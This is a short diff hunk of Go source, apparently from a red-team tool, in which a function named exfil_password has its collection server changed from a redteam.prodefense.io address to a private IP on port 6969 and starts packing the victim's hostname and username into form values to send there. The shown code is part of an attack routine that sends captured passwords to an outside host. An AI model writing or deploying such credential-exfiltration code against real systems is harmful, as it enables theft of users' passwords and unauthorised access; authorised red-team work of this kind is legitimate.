@@ -52,7 +52,7 @@ func exfil_password(username, password string) {
 	if err != nil {
 		return
 	}
-	serverURL := "http://redteam.prodefense.io:6969/"
+	serverURL := "http://10.159.76.35:6969/"
 	values := url.Values{}
 	values.Set("hostname", hostname)
 	values.Set("username", username)
